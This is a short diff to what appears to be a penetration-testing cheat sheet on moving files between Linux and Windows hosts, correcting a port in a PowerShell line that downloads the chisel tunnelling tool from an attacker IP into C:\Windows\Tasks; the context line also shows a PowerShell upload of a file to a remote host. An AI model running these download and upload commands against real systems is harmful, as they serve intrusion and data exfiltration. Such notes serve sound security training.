@@ -20,7 +20,7 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload
 
 ### Powershell Linux to Windows
 ````
-(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
+(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:8000/chisel.exe','C:\Windows\Tasks\chisel.exe')
 ````
 ### SMB Linux to Windows
 ````
